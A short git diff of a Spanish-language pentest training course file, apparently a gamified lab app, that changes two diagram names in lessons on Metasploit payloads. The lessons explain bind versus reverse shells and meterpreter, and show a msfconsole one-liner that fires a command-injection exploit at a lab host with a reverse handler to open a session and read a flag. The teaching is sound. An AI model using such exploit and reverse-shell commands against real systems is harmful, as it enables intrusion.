@@ -71,7 +71,7 @@ const EXPLOIT_MSF: Curso = {
       title: "El payload: qué te deja el exploit adentro",
       body:
         "El exploit es la GRIETA; el payload es lo que metés por la grieta. Los dos grandes tipos:\n\n• bind_tcp: el payload abre un puerto EN la víctima y vos te conectás. Falla si hay firewall de entrada.\n• reverse_tcp: la víctima se conecta HACIA VOS (por eso pedís LHOST/LPORT). Atraviesa la mayoría de los firewalls de salida — por eso es el más usado.\n\nY el tipo de sesión: una shell es una línea de comandos cruda; meterpreter es una sesión rica (sysinfo, subir/bajar archivos, pivotar) que vive en memoria. En ÑandeMSF elegís el payload con set PAYLOAD y lo ves con show payloads.",
-      diagram: "ip",
+      diagram: "payload",
       bullets: [
         "reverse_tcp (víctima→vos) suele ganarle al firewall de salida.",
         "meterpreter > shell: más capacidades, vive en memoria.",
@@ -86,7 +86,7 @@ const EXPLOIT_MSF: Curso = {
         'msfconsole -x "use exploit/nande/http/cmd_injection; set RHOSTS 10.10.5.50; set LHOST 10.10.0.5; set LPORT 4444; exploit"',
       explain:
         "El handler inverso escucha, el exploit inyecta el comando y la víctima se conecta de vuelta: 'Sesión meterpreter 1 abierta'. Capturás la bandera NANDE{owasp_top10_labs} y el laboratorio queda resuelto (+XP). Eso es tomar un sistema: de una web vulnerable a una shell adentro. Interactuás con sessions -i 1 (sysinfo, getuid, cat flag).",
-      diagram: "inyeccion",
+      diagram: "exploit",
     },
     {
       kind: "quiz",
